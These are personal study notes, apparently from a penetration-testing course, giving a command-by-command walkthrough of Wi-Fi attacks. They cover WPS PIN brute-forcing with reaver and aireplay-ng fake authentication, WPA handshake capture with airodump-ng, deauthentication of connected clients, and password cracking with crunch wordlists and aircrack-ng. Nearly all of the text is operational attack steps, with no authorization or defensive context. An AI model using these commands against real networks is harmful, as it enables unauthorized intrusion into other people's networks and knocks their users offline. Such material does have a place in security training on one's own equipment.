WPS ENABLED AND PBC DISABLED
wpa and wpa2 have a wps feature which makes it easier to connect to it
if wps is enabled and there is no PBC(push button authentication) enabled, we can easily connect to the network
a wps enabled network doesnt need the passwd for connecting to it, but a 8 digit pin

wash --interface <mon interface> finds all networks with their wps on
aireplay-ng --fakeauth <time btw each attack> -a <target bssid> -h <my bssid> <mon interface> but don't start it yet, go to another terminal now
you can see your bssid as first 12 digits seperated by - beside unspec, using ifconfig

reaver --bssid <target> --channel <ch> --interface <mon interface> -vvv --no-associate and enter to start bruteforce
go to above terminal and start aireplay fake authentication attack

latest version of reaver may be buggy, send_packet called from resend_last_packet() send.c:161 is repeating itself very fast
then we have to use older version of reaver 1.6.1
open the folder where it is downloaded to 
cd Downloads/
chmod +x reaver to make it as a executable in permissions
./reaver --bssid <target> --channel <ch> --interface <mon interface> -vvv --no-associate
-vvv gives information about the process and no-associate will stop reaver from doing association automatically which is buggy
if cracked, we will get it at wps psk

HANDSHAKE CAPTURE
airodump-ng --band abg <mon interface> to find all 5hz and 2.4hz networks
airodump-ng --bssid <target> --channel <ch> --write <storing file for captured date> <mon interface> to store captured data
wait till a client connects to the network
do deauth attack to the client to speed the process

aireplay-ng --deauth 5 -a <target> -c <client> <mon interface>
this time no.of attacks should be small
stop attack when wpa handshake is captured

CRACKING CAPTURED HANDSHAKE
we can do this using wordlists or bruteforce(for number password)
we use crunch to create a own wordlist

crunch <min characters> <max> <characters like abc123!@#> -t <combination like a@@@b> -o<file to save>
for example, use
crunch 6 8 abc12 -o test.txt
use cat test.txt to view the file

aircrack-ng <handshake.cap cap file> -w <worldlist.txt wordlist file>
if the key is in the wordlist, only then will the password be found
you can use free websites like onlinehashcrack to do dictionary attacks
